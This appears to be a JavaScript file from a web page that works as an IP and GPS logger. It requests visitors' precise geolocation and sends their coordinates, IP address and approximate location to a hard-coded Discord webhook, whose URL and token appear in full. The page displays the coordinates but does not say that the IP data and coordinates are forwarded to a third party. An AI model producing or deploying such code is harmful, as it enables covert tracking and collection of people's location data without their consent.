url = 'https://discord.com/api/webhooks/1022789439187071008/aUDv-B7XD1sXdntjrF4OzksA0SSb_uoNqQ9uSTCA729Ydu13zyMMhTTwUvfGldXIxkJ6'

function callback(data) {
    var ip_data =
    {
        method: 'POST', mode: 'cors',
        headers: {'Content-type': 'application/json'},
        body: JSON.stringify({ 'username': 'foryzen bot', 'content': 'IP : '+data.ip+' / '+data.loc })
    }

    send(ip_data)
}

function get(){
    navigator.geolocation.getCurrentPosition((position)=>{
        var location = position.coords.latitude+', '+position.coords.longitude
        document.getElementById('location_txt').innerHTML = location
        var location = 'GPS : '+location
        var gps_data =
        {
            method: 'POST', mode: 'cors',
            headers: {'Content-type': 'application/json'},
            body: JSON.stringify({ 'username': 'foryzen bot', 'content': location })
        }

        send(gps_data)
    }, error_, {'enableHighAccuracy': true})
}

function error_(){
    alert('GPSがオフです')
}

function send(data){fetch(url, data)}